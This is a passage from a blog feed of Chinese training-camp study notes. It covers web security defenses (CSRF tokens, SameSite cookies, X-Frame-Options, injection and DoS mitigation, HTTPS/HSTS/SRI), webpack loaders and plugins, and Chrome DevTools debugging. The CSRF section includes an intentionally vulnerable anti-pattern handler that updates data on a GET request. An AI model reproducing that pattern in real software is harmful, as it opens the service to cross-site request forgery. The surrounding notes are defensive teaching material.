title="#csrf" href="#csrf"></a></h3><p>因为其是<strong>伪造请求</strong>，是<strong>异常来源</strong>，then <strong>限制请求来源</strong>，也就<strong>限制了 伪造请求</strong></p><ul><li><p>方法</p><ul><li><p>服务端开发人员可以通过校验 <strong>Origin (同源请求中，GET + HEAD 不发送)，Referer（更广泛应用）</strong></p></li><li><p>token：</p><p>Browser      →1. 请求页面 →            Server</p><p>​                    ← 2.页面 + token ←</p><p>​                     →3. 请求API+token →</p><p>​                     ← 4.验证 token + 数据←</p></li></ul><p>注意：</p><ol><li>要进行用户绑定</li><li>要设置过期时间</li></ol><blockquote><p>因为 请求来自合法页面，服务器接收过页面请求，服务器就可以表示</p></blockquote></li></ul><h4 id="csrf-—-iframe-攻击">CSRF — iframe 攻击<a title="#csrf-—-iframe-攻击" href="#csrf-—-iframe-攻击"></a></h4><p>因为这样就是同源的发送请求了，没办法用 Origin 限制了，</p><ul><li><p>方法</p><p>使用 响应头部：<code>X-Frame-Options:deny/sameorigin</code></p><p>deny：不能访问</p><p>sameorigin：同源可以访问</p></li></ul><h4 id="csrf-anti-pattern">CSRF anti-pattern<a title="#csrf-anti-pattern" href="#csrf-anti-pattern"></a></h4><p>GET != GET + POST、明确 get、post 请求各自的功能</p><blockquote><p>如果写成下面的样子，攻击者很容易一石二鸟</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将更新 获取 逻辑放到同一个 get</span></span><br><span class="line">public <span class="keyword">async</span> <span class="title function_">getAndUpdate</span>(<span class="params">ctx</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; update, id &#125; = ctx.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span>(update)&#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(update);</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">get</span>(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="避免用户信息被携带：samesite-cookie">避免用户信息被携带：SameSite Cookie<a title="#避免用户信息被携带：samesite-cookie" href="#避免用户信息被携带：samesite-cookie"></a></h4><p>从根源上解决了 csrf，csrf 是利用用户权限及 cookie，去伪造自己是该用户来进行恶意操作，如果攻击者无法获取到 用户的 cookie 那就没用办法进行伪造了。</p><p>sameSite 限制了 <strong>cookie domain、页面域名；</strong></p><blockquote><p>如果是有 cookie 依赖第三方服务的，可以设置</p><p><code>Set-Cookie: SameSite=None; Secure;</code></p></blockquote><p>SameSite 与 CORS 对比：</p><p>SameSite：Cookie 发送、domain 与 页面域名</p><p>CORS：资源读写 http请求、资源域名 与 页面域名、白名单</p><h4 id="正确防御-csrf-—-中间件">正确防御 CSRF — 中间件<a title="#正确防御-csrf-—-中间件" href="#正确防御-csrf-—-中间件"></a></h4><h2 id="injection">Injection<a title="#injection" href="#injection"></a></h2><h4 id="sql-1">SQL<a title="#sql-1" href="#sql-1"></a></h4><p>找到项目中查询 SQL 的地方，使用 prepared statement</p><h4 id="beyond-sql">beyond SQL<a title="#beyond-sql" href="#beyond-sql"></a></h4><ol><li><p>最小权限原则</p><p>不允许访问 sudo || root</p></li><li><p>建立允许名单 + 过滤</p><p>不允许进行 rm 这种系统操作</p></li><li><p>对 URL 类型参数进行协议、域名、ip等限制</p><p>禁止访问内网</p></li></ol><h2 id="dos">DoS<a title="#dos" href="#dos"></a></h2><h4 id="regex-dos">Regex DoS<a title="#regex-dos" href="#regex-dos"></a></h4><ol><li>进行 code review，避免出现 贪婪模式的 正则</li><li>代码扫描 + 正则性能测试</li><li>禁止使用用户提供的正则</li></ol><h4 id="logical-dos-1">Logical Dos<a title="#logical-dos-1" href="#logical-dos-1"></a></h4><ol><li>不是非黑即白：有些情况只有再在请求量大到一定之后才会体现</li><li>分析代码中的性能瓶颈</li><li>限流</li></ol><h4 id="ddos">DDos<a title="#ddos" href="#ddos"></a></h4><ol><li>流量治理<ul><li>负载均衡 – 过滤</li><li>api 网关 – 过滤</li><li>cdn – 抗量</li></ul></li><li>快速自动扩容 – 抗量</li><li>非核心服务降级 – 抗量</li></ol><h2 id="传输层-—-防御中间人">传输层 — 防御中间人<a title="#传输层-—-防御中间人" href="#传输层-—-防御中间人"></a></h2><p>使用 https = http + TLS</p><p>https的特性：</p><ul><li>可靠性：加密，非明文传输</li><li>完整性：MAC 验证，禁止篡改   — 通过 验证 hash</li><li>不可抵赖性：数字签名，进行身份验证  — 密码学</li></ul><h4 id="hsts---http-strict-transport-security">HSTS - HTTP Strict-Transport-Security<a title="#hsts---http-strict-transport-security" href="#hsts---http-strict-transport-security"></a></h4><p>将 HTTP 升级到 HTTPS</p><p>设置请求头：<code>Strict-Transport-Security：max-age=3600</code></p><h4 id="sri-—-subresource-integrity">SRI — Subresource Integrity<a title="#sri-—-subresource-integrity" href="#sri-—-subresource-integrity"></a></h4><p>防止 CDN 静态资源被篡改：对比 hash</p><h4 id="feature-/-permission-policy">Feature / Permission Policy<a title="#feature-/-permission-policy" href="#feature-/-permission-policy"></a></h4><p>限制一个页面下，可以使用哪些功能</p><p>iframe 也可以通过 allow=“xxx” 设置</p>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 青训营 </tag>
            
            <tag> 前端安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>构建 webpack 知识体系 - 字节青训营</title>
      <link href="/learningNotes/ByteDance/12%20%E6%9D%8E%E6%96%87%E6%9D%B0%20webpack"/>
      <url>/learningNotes/ByteDance/12%20%E6%9D%8E%E6%96%87%E6%9D%B0%20webpack</url>
      
        <content type="html"><![CDATA[<h1 id="构建-webpack-知识体系">构建 webpack 知识体系<a title="#构建-webpack-知识体系" href="#构建-webpack-知识体系"></a></h1><p>知识体系：<a href="https://gitmind.cn/app/doc/fac1c196e29b8f9052239f16cff7d4c7">https://gitmind.cn/app/doc/fac1c196e29b8f9052239f16cff7d4c7</a></p><h2 id="1.-什么是webpack">1. 什么是webpack<a title="#1.-什么是webpack" href="#1.-什么是webpack"></a></h2><p>本质上是一种前端资源编译、打包工具</p><ul><li>多份资源文件打包成一个Bundle</li><li>支持 Babel、Eslint、TS、CoffeScript、Less、Sass</li><li>支持模块化处理 css、图片等资源文件</li><li>支持 HMR + 开发服务器</li><li>支持持续监听、持续构建</li><li>支持代码分离</li><li>支持 Tree-shaking</li><li>支持 Sourcemap</li><li>…</li></ul><h2 id="2.-使用-webpack">2. 使用 webpack<a title="#2.-使用-webpack" href="#2.-使用-webpack"></a></h2><h3 id="1.-示例">1. 示例<a title="#1.-示例" href="#1.-示例"></a></h3><ol><li><p>安装</p><p><code>npm i -D webpack webpack-cli</code></p></li><li><p>编辑配置文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">entry</span>:<span class="string">&quot;main.js&quot;</span>,</span><br><span class="line">    <span class="attr">output</span>:&#123;</span><br><span class="line">        <span class="attr">filename</span>:<span class="string">&quot;[name].js&quot;</span>,</span><br><span class="line">        <span class="attr">path</span>:path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;./dist&quot;</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">module</span>:&#123;</span><br><span class="line">        <span class="attr">rules</span>:[&#123;</span><br><span class="line">            <span class="attr">test</span>:<span class="regexp">/\.less$/i</span>,</span><br><span class="line">            <span class="attr">use</span>:[<span class="string">&#x27;style-loader&#x27;</span>,<span class="string">&#x27;css-loader&#x27;</span>,<span class="string">&#x27;less-loader&#x27;</span>]</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>执行编译命令</p><p><code>npx webpack</code></p></li></ol><h3 id="2.-核心流程-—-极简化版">2. 核心流程 — 极简化版<a title="#2.-核心流程-—-极简化版" href="#2.-核心流程-—-极简化版"></a></h3><ol><li>入口处理 ： 从entry文件开始启动编译流程</li><li>依赖解析 ：根据require、import等找到依赖资源</li><li>资源解析 ：根据module配置，调用资源转移器，将css等非标准js资源转译为 js 内容</li><li>资源合并打包 ：将转译后的资源内容合并打包为可直接在浏览器运行的js</li></ol><h3 id="3.-配置项概览">3. 配置项概览<a title="#3.-配置项概览" href="#3.-配置项概览"></a></h3><p>使用 webpack 的方法：<strong>基本围绕 “配置”展开，可分为</strong></p><ul><li>流程类：作用于流程中某个 or 若干个环节，直接影响打包效果的配置项<ul><li>输入：entry、context</li><li>模块解析：resolve、externals</li><li>模块转译：module</li><li>后处理：optimization、mode、target</li></ul></li><li>工具类：主流程之外，提供更多工程化能力的配置项<ul><li>开发效率类：watch、devtool、devServer</li><li>性能优化类：cache、performance</li><li>日志类：stats、infrastructureLogging</li><li>其他：amd、bail</li></ul></li></ul><p>配置项的使用频率：</p><ul><li>entry/output</li><li>module/plugins</li><li>mode</li><li>watch/devServer/devtools</li></ul><h4 id="3.1-处理-css-–-style-loader,css-loader">3.1 处理 css – style-loader,css-loader<a title="#3.1-处理-css-–-style-loader,css-loader" href="#3.1-处理-css-–-style-loader,css-loader"></a></h4><ol><li>安装loader</li><li>编辑配置项</li></ol><blockquote><p>loader 有什么作用？为什么要用到 css-loader、style-loader？</p><p>A: 因为 webpack 只认识 js，为了处理非标准js资源，设计出的资源翻译模块 — loader，将资源翻译为标准 js</p><p>与在 html 文件中维护 css 相比，这种方式会有什么优劣？</p><p>如何在webpack接入less、sass、stylus？</p></blockquote><h4 id="3.2-处理-js-–-接入-babel">3.2 处理 js – 接入 Babel<a title="#3.2-处理-js-–-接入-babel" href="#3.2-处理-js-–-接入-babel"></a></h4><ol><li>安装依赖 <code>npm i -D @babel/core @babel/preset-env babel-loader</code></li><li>声明 output</li><li>执行 npx webpack</li></ol><blockquote><p>Babel 有什么功能</p><p>Babel 与 webpack 分别解决了什么问题</p></blockquote><h4 id="3.3-生成-html">3.3 生成 HTML<a title="#3.3-生成-html" href="#3.3-生成-html"></a></h4><ol><li>安装依赖 <code>npm i -D html-webpack-plugin</code></li><li>声明产物出口 output</li><li>使用插件 <code>plugins:[new HtmlWebpackPlugin]</code></li><li>执行 <code>npx webpack</code></li></ol><blockquote><p>相比于手工维护的 HTML 内容，这种自动生成的方式有什么优缺点？</p></blockquote><h3 id="4.-工具线">4. 工具线<a title="#4.-工具线" href="#4.-工具线"></a></h3><h4 id="4.1-hmr-浏览器热替换">4.1 HMR 浏览器热替换<a title="#4.1-hmr-浏览器热替换" href="#4.1-hmr-浏览器热替换"></a></h4><ol><li>更改配置项 devServer: { hot: true, open: true } ,watch: true // 持续监听，生成新的</li><li>执行 npx webpack server</li></ol><h4 id="4.2-tree-shaking-树摇">4.2 Tree-Shaking 树摇<a title="#4.2-tree-shaking-树摇" href="#4.2-tree-shaking-树摇"></a></h4><p>开启树摇</p><p>更改配置项：</p><ul><li><p>mode: ”production“,</p></li><li><p>optimization: { usedExports: true }</p></li></ul><blockquote><p>对工具库如Lodash有奇效</p><p>require 不能进行 tree-shaking</p></blockquote><h4 id="4.3-其他工具">4.3 其他工具<a title="#4.3-其他工具" href="#4.3-其他工具"></a></h4><ul><li>缓存 webpack5后的缓存效果才比较好</li><li>Sourcemap</li><li>性能监控</li><li>日志</li><li>代码压缩</li><li>分包</li><li>…</li></ul><blockquote><p>还有哪些可被划分为”流程类“？</p><p>工具类配置具体有什么作用，包括 devtool/cache/stat</p></blockquote><h2 id="3.-理解-loader">3. 理解 Loader<a title="#3.-理解-loader" href="#3.-理解-loader"></a></h2><p><strong>为了处理非标准 js 资源，设计出资源翻译模块 — Loader，用于将资源翻译为标准  JS</strong></p><h3 id="3.1-使用：">3.1 使用：<a title="#3.1-使用：" href="#3.1-使用："></a></h3><ol><li>安装 Loader</li><li>添加 module 处理 需要翻译的文件</li></ol><h3 id="3.2-认识loader">3.2 认识Loader<a title="#3.2-认识loader" href="#3.2-认识loader"></a></h3><h4 id="链式调用">链式调用<a title="#链式调用" href="#链式调用"></a></h4><p>前面的输出 == 后面的输入，每个 loader 比较内聚，</p><p>以 处理 less 文件为例：</p><ul><li>less-loader：实现 less 到 css 的转换</li><li>css-loader：将 css 包装成类似于 module.exports = “${css}” 的内容，包装后的内容符合js 语法</li><li>style-loader：将 css 模块包进 require 语句，并在运行时调用 injectStyle 等函数将内容注入到页面的style标签</li></ul><p>debug工具： ndb <code>ndb npx webpack</code></p><p>特点：</p><ul><li>链式调用</li><li>支持异步执行</li><li>分 normal、pitch 两种模式</li></ul><h4 id="如何编写">如何编写<a title="#如何编写" href="#如何编写"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// loader.js</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span>(<span class="params">source,sourceMap,data?</span>)&#123;</span><br><span class="line">    <span class="comment">// source 为 文件输入</span></span><br><span class="line">    <span class="comment">// 可能是文件内容，也可以是上一个 loader 处理结果</span></span><br><span class="line">    <span class="keyword">return</span> source;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// eslint-loader/index.js</span></span><br><span class="line"><span class="keyword">import</span> getOptions <span class="keyword">from</span> <span class="string">&#x27;./getOptions&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Linter</span> <span class="keyword">from</span> <span class="string">&#x27;./Linter&#x27;</span></span><br><span class="line"><span class="keyword">import</span> cacheLoader <span class="keyword">from</span> <span class="string">&#x27;./cacheLoader&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> defalut <span class="keyword">function</span> <span class="title function_">loader</span>(<span class="params">content, map</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> options = <span class="title function_">getOptions</span>(<span class="variable language_">this</span>);</span><br><span class="line">    <span class="keyword">const</span> linter = <span class="keyword">new</span> <span class="title class_">Linter</span>(<span class="variable language_">this</span>, options);</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">cacheable</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(options.<span class="property">cache</span>)&#123;</span><br><span class="line">        <span class="title function_">cacheLoader</span>(linter, content, map);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    linter.<span class="title function_">printOutput</span>(linter.<span class="title function_">lint</span>(content));</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">callback</span>(<span class="literal">null</span>, content, map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：Webpack 原理系列七：如何编写loader</p><h4 id="常见loader">常见loader<a title="#常见loader" href="#常见loader"></a></h4><p>理解</p><ul><li>js：babel、eslint、ts、buble、vue、angular2-template   - loader</li><li>css：css、style、less、sass、stylus、postcss - loader</li><li>html：html、pug、pisthtml - loader</li><li>assets：file、val、url、json5 - loader</li></ul><blockquote><p>loader 输入是什么？要求输出的是什么？</p><p>loader 的链式调用是什么意思？如何串联多个 loader？</p><p>loader 中如何处理异步场景？</p></blockquote><h2 id="4.-理解插件">4. 理解插件<a title="#4.-理解插件" href="#4.-理解插件"></a></h2><h3 id="4.1-插件是什么，为什么这么设计？">4.1 插件是什么，为什么这么设计？<a title="#4.1-插件是什么，为什么这么设计？" href="#4.1-插件是什么，为什么这么设计？"></a></h3><p>插件架构精髓：对扩展开放、对修改封闭</p><h3 id="4.2-理解插件">4.2 理解插件<a title="#4.2-理解插件" href="#4.2-理解插件"></a></h3><p>插件围绕钩子展开</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SomePlugin</span>&#123;</span><br><span class="line">    <span class="title function_">apply</span>(<span class="params">compiler</span>)&#123;</span><br><span class="line">        compiler.<span class="property">hooks</span>.<span class="property">thisCompilation</span>.<span class="title function_">tap</span>(<span class="string">&#x27;SomePlugin&#x27;</span>, <span class="function"><span class="params">compilation</span> =&gt;</span> &#123;</span><br><span class="line">            </span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>钩子的核心信息：</p><ol><li>时机：编译过程的特定节点，Webpack 会以钩子的形式通知插件此刻正在发生什么事请</li><li>上下文：通过 tapable 提供的回调机制，以参数方式传递上下文信息；</li><li>交互：在上下文参数对象中附带了很多存在 side effect 的交互接口，插件可以通过这些接口改变</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">EntryPlugin</span>&#123;</span><br><span class="line">    <span class="title function_">apply</span>(<span class="params">compiler</span>)&#123;</span><br><span class="line">        compiler.<span class="property">hooks</span>.<span class="property">compilation</span>.<span class="title function_">tap</span>( <span class="comment">// 时机 compiler.hooks.compilation</span></span><br><span class="line">            <span class="string">&#x27;EntryPlugin&#x27;</span>,</span><br><span class="line">             <span class="function">(<span class="params">compilation,&#123; normalModuleFactory &#125;</span>) =&gt;</span> &#123;  <span class="comment">// 参数 compilation</span></span><br><span class="line">                 compilation.<span class="property">dependencyfactories</span>.<span class="title function_">set</span>(  <span class="comment">// 交互 dependencyfactories.set</span></span><br><span class="line">                 <span class="title class_">EntryDenpendency</span>,</span><br><span class="line">                    noemalModuleFactory</span><br><span class="line">                 );</span><br><span class="line">             &#125;);</span><br><span class="line">        </span><br><span class="line">        compiler.<span class="property">hooks</span>.<span class="property">make</span>.<span class="title function_">tapAsync</span>(<span class="string">&#x27;EntryPlugin&#x27;</span>, <span class="function">(<span class="params">compilation, callback</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;entry,options, context &#125; = <span class="variable language_">this</span>;</span><br><span class="line">            <span class="keyword">const</span> dep = <span class="title class_">EntryPlugin</span>.<span class="title function_">createDependency</span>(entry, options);</span><br><span class="line">            compilation.<span class="title function_">addEntry</span>(context, dep, options, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">callback</span>(err);</span><br><span class="line">            &#125;)</span><br><span class="line">            </span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>loader 与插件有什么区同点？</p><p>”钩子“有什么作用？如何监听钩子函数？</p></blockquote><h2 id="5.-学习方法">5. 学习方法<a title="#5.-学习方法" href="#5.-学习方法"></a></h2><ol><li>入门应用<ul><li>理解打包流程</li><li>熟练掌握常用配置项、loader、插件的使用方法、能够灵活搭建集成 Vue、React、Babel、Eslint、Less、Sass、图片处理等工具的webpack环境</li><li>掌握常见脚手架工具，例如 Vue-cli、create-react-app、@angular/cli</li></ul></li><li>进阶<ul><li>理解Loader、Plugin机制，能够自行开发 Webpack 组件</li><li>理解常见性能优化手段，并能用于解决实际问题</li><li>理解前端工程化概念与生态现状</li></ul></li><li>大师级<ul><li>阅读源码，理解 编译、打包原理，能参与共建</li></ul></li></ol><h2 id="q&amp;a">Q&amp;A<a title="#q&amp;a" href="#q&amp;a"></a></h2><h5 id="面试掌握程度？">面试掌握程度？<a title="#面试掌握程度？" href="#面试掌握程度？"></a></h5><ul><li>loader 有什么作用，怎么写 loader、常见的 loader有什么</li><li>怎么写一个 插件</li><li>bundle、chunk、module 是什么含义？</li></ul><h5 id="require-与-import-导入的区别？">require 与 import 导入的区别？<a title="#require-与-import-导入的区别？" href="#require-与-import-导入的区别？"></a></h5><ul><li>动态/静态代码</li></ul><h5 id="webpack-与-vite-？">webpack 与 vite ？<a title="#webpack-与-vite-？" href="#webpack-与-vite-？"></a></h5><ul><li>vite：速度快 ，无 bundle，对开发性友好</li><li>webpack：生态成熟，</li></ul><h5 id="loader-与-plugin-区别？">loader 与 plugin 区别？<a title="#loader-与-plugin-区别？" href="#loader-与-plugin-区别？"></a></h5><ul><li>loader：内容翻译为js</li><li>plugin：没有明确输入输出，作用于整个生命周期，在任意时间修改任意webpack组件</li></ul><h5 id="webpack-与-rollup">webpack 与 rollup<a title="#webpack-与-rollup" href="#webpack-与-rollup"></a></h5><ul><li>webpack 更重，应对浏览器</li><li>rollup 用来构建npm包，扩展性弱，应对库的场景</li></ul><h5 id="webpack-优化">webpack 优化<a title="#webpack-优化" href="#webpack-优化"></a></h5><h5 id="npx-与-npm">npx 与 npm<a title="#npx-与-npm" href="#npx-与-npm"></a></h5>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 青训营 </tag>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端必须知道的开发调试知识 - 字节青训营</title>
      <link href="/learningNotes/ByteDance/05%20%E7%A7%83%E5%A4%B4%E6%8A%AB%E9%A3%8E%E4%BE%A0%20%E5%89%8D%E7%AB%AF%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E5%BC%80%E5%8F%91%E8%B0%83%E8%AF%95%E7%9F%A5%E8%AF%86"/>
      <url>/learningNotes/ByteDance/05%20%E7%A7%83%E5%A4%B4%E6%8A%AB%E9%A3%8E%E4%BE%A0%20%E5%89%8D%E7%AB%AF%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E5%BC%80%E5%8F%91%E8%B0%83%E8%AF%95%E7%9F%A5%E8%AF%86</url>
      
        <content type="html"><![CDATA[<h2 id="1.-bug-与-debug">1. Bug 与 Debug<a title="#1.-bug-与-debug" href="#1.-bug-与-debug"></a></h2><h3 id="1.1-bug来源">1.1 bug来源<a title="#1.1-bug来源" href="#1.1-bug来源"></a></h3><h3 id="1.2-bug-特点">1.2 bug 特点<a title="#1.2-bug-特点" href="#1.2-bug-特点"></a></h3><ul><li>多平台：浏览器、hybrid、nodejs、小程序、桌面应用</li><li>多环境：本地开发环境、线上环境</li><li>多工具：chrome devtools、charles、spy-debugger、whistie、vconsole</li><li>多技巧：console、breakpoint、sourceMap、代理</li></ul><h2 id="2.-chrome-devtool">2. Chrome devTool<a title="#2.-chrome-devtool" href="#2.-chrome-devtool"></a></h2><h3 id="2.1-elements-–-修改元素和样式">2.1 Elements – 修改元素和样式<a title="#2.1-elements-–-修改元素和样式" href="#2.1-elements-–-修改元素和样式"></a></h3><blockquote><p>.cls 添加删除类名</p><p>右键元素 → fouce state → ± 伪类 / ：hov<br>对结点进行截图：元素右键 → capture node screenshot</p></blockquote><h3 id="2.2-console-–-日志页面">2.2 Console – 日志页面<a title="#2.2-console-–-日志页面" href="#2.2-console-–-日志页面"></a></h3><blockquote><p>对 log 的值 进行 修改样式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;%s %o,%c%s&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;hello&#x27;</span>,          <span class="comment">// %s字符串 </span></span><br><span class="line">         &#123;<span class="attr">name</span>:<span class="string">&#x27;tom&#x27;</span>&#125;,     <span class="comment">// o 对象</span></span><br><span class="line">         <span class="string">&#x27;color:red&#x27;</span>,      <span class="comment">// c 样式？</span></span><br><span class="line">         <span class="string">&#x27;welcome&#x27;</span>)        <span class="comment">// </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>console.table 具象化 JSON 数据 转换为 table 格式</p><p>console.dir 树形结构</p></blockquote><h3 id="2.3-sources">2.3 sources<a title="#2.3-sources" href="#2.3-sources"></a></h3><ol><li><p>组成</p><ul><li><p>页面资源文件目录树</p></li><li><p>代码预览区</p></li><li><p>debug 工具栏</p><blockquote><p>暂停 继续 断点间</p><p>单步跳过</p><p>进入函数</p><p>跳出函数</p><p>单步执行</p><p>激活 / 关闭 所有断电</p><p>代码执行异常处自动</p></blockquote></li><li><p>断点调试器</p><blockquote><p>xhr/fetch ：当有请求发生时触发断点</p><p>dom ：右键 break on，增删结点触发</p><p>scope：作用域 closure 闭包</p><p>call stack：调用栈</p></blockquote></li></ul></li><li><p>查看暂停下 变量的值：</p><ul><li>breakPoint：debugger; 区域4 的 breakpoints 可以勾选 或 取消 可以打断点；直接鼠标移动可以查看值</li><li>区域4 watch：点击 + 可以添加 变量 查看值</li></ul></li><li><p>压缩代码如何调试：</p><ul><li><p>用webpack压缩，在webpack.config.js 中 devtools：‘source-map’，</p><blockquote><p>多导出一个 bundle.js.map 把压缩的代码和源码进行映射</p><ul><li>mappings 字段存储了源文件和source map 映射<ul><li>英文，表源码及压缩代码的位置关联</li><li>逗号，分割一行的内容</li><li>分号，换行</li></ul></li></ul><p>映射见：<a href="http://murzwin.com/base64vlqhtml">murzwin.com/base64vlqhtml</a></p><p>source map 标准：<a href="http://docs.google.com/document/d/1URGAehQwRypUTovF1KRlpiOFze0b-_2gc6fAH0KY0k/edit">docs.google.com/document/d/1URGAehQwRypUTovF1KRlpiOFze0b-_2gc6fAH0KY0k/edit</a></p></blockquote></li></ul></li></ol><h3 id="2.4-performance-—-性能">2.4 performance — 性能<a title="#2.4-performance-—-性能" href="#2.4-performance-—-性能"></a></h3><ol><li><p>组成 — 开始录制页面  stop</p><ul><li><p>控制面板</p></li><li><p>概览面板</p><p>FPS：每秒帧数</p><p>CPU：处理各个任务花费的时间</p><p>NET：各个请求花费的时间</p></li><li><p>线程面板</p><p>Frames：帧线程</p><p>Main：主线程、负责执行js，解析html css 完成绘制</p><p>Raster：raster 线程，负责完成某个layer 或 某些块 tile 的绘制</p></li><li><p>统计面板</p></li></ul></li></ol><h3 id="2.5-network-—-请求相关">2.5 Network — 请求相关<a title="#2.5-network-—-请求相关" href="#2.5-network-—-请求相关"></a></h3><p>可以自定义网速</p><img src="https://i.bmp.ovh/imgs/2022/01/38b5ba1f5f907e8d.png"><h3 id="2.6-application-—-本地存储相关">2.6 application — 本地存储相关<a title="#2.6-application-—-本地存储相关" href="#2.6-application-—-本地存储相关"></a></h3><h3 id="2.7-storage中点击-clean-site-data-清除缓存">2.7 storage中点击 clean site data 清除缓存<a title="#2.7-storage中点击-clean-site-data-清除缓存" href="#2.7-storage中点击-clean-site-data-清除缓存"></a></h3><h2 id="3.-移动端-h5-调试">3. 移动端 h5 调试<a title="#3.-移动端-h5-调试" href="#3.-移动端-h5-调试"></a></h2><ol><li><p>真机调试：推荐扫码</p></li><li><p>代理调试：</p></li><li><p>常用工具：</p><p>charles：适合查看、控制网络请求，分析数据</p><p>fiddler：与上面类似，适合windows 平台</p><p>spy-debugger：远程调试手机页面、抓包</p><p>whistie：基于node实现的跨平台web调试代理工具</p></li></ol><h2 id="4.-常用开发技巧：">4. 常用开发技巧：<a title="#4.-常用开发技巧：" href="#4.-常用开发技巧："></a></h2><ul><li><p>source：oversides，勾选，在修改后刷新会保留，右边竖三点，more tools -&gt; change 面板会显示 修改的内容</p></li><li><p>跨域问题：报 cors error 跨域错误</p><p>使用代理工具</p><p>代理：解决了同源策略的哪一项，为什么能解决跨域</p><blockquote><p>同源限制只显示了浏览器</p></blockquote><img src="https://i.bmp.ovh/imgs/2022/01/20d4963af61cfd07.png"></li><li><p>启用本地source map：</p><p>可以把 source map 代理到本地</p></li><li><p>前端埋点</p></li><li><p>小黄鸭</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> 青训营 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nodejs 与前端开发实战 - 字节青训营</title>
